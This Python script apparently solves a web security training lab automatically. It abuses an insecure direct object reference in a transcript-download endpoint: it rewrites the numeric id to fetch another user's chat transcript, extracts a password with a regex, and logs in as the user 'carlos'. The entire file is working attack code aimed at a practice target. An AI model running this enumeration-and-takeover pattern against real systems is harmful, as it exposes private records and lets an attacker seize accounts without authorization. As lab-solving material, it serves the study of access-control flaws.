from ..utils import *
import re


def solve_lab(session, *args):
    # File upload
    print_info("Sending fake transcript file to '/download-transcript'...")
    files = {"transcript": (None, "")}
    resp = session.post_path("/download-transcript", files=files, allow_redirects=False)

    if resp.status_code != 302:
        print_fail("Did not receive expected 302 status code.")
    else:
        location = resp.headers["Location"]
        print_success(f"Found redirect path: {location}\n")

    # IDOR
    path = re.sub(r"[0-9]+", "1", location)
    print_info(f"Exploiting IDOR vulnerability by visiting '{path}'...")

    resp = session.get_path(path)
    if resp.status_code != 200:
        print_fail("Unable to download transcript.")
    else:
        print_success("Downloaded the following transcript:\n")
        print(resp.text)

    password = re.search(f"my password is (.*)\.", resp.text).group(1)
    session.login("carlos", password)
